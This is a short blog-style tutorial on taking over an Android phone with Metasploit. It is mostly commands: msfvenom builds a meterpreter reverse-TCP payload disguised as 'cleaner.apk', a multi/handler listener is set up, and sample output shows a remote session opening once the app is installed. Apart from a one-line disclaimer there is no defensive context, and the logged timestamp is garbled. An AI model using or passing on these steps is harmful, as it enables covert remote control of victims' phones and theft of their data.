---
layout: post
title: How to hack an Android Device
---

This is a tutorial for hacking an android using Metasploit Framework.

*Note: This tutorial is for educational purposes I'm not responsible for any misuse of it.*

## Requirements:
<br />
* Kali Linux
* Metasploit Framework installed.

*Note: This can be done on other distros with Metasploit package but Kali Linux gives favourable environment with all packages pre-installed.*

## Steps:
<br />
* Create an android apk file using msfvenom.
```bash
$ msfvenom -p android/meterpreter/reverse_tcp LHOST="IP ADDR"
 LPORT=4444 R > cleaner.apk
```
*Note: Replace IP ADDR with your ip address.*

* Fire up msfconsole
```bash
$ msfconsole
```
* To listen to the payload, setup a handler.
```bash
msf> use exploit/multi/handler
msf exploit(handler)> set PAYLOAD android/meterpreter/reverse_tcp
```

* Check its configurations.
```bash
msf exploit(handler)> show options
```

* Set the LHOST and LPORT you specified earlier using these commands.
```bash
msf exploit(handler)> set LHOST "IP ADDR"
msf exploit(handler)> set LPORT 4444
```

* Start the exploit
```bash
msf exploit(handler)> exploit
```
You need to transfer the apk file we generated previously to the testing phone and install it. Once that app is opened in the phone meterpreter session will start.
```bash
[*] Started reverse TCP handler on 192.168.0.100:4444
[*] Starting the payload handler...
[*] Sending stage (63194 bytes) to 192.168.0.106
[*] Meterpreter session 1 opened (192.168.0.100:4444 ->
 192.168.0.106:35897) at 2016-055-24 _05:30
meterpreter >
```
* Done!

* For options use this
```bash
meterpreter > help
```
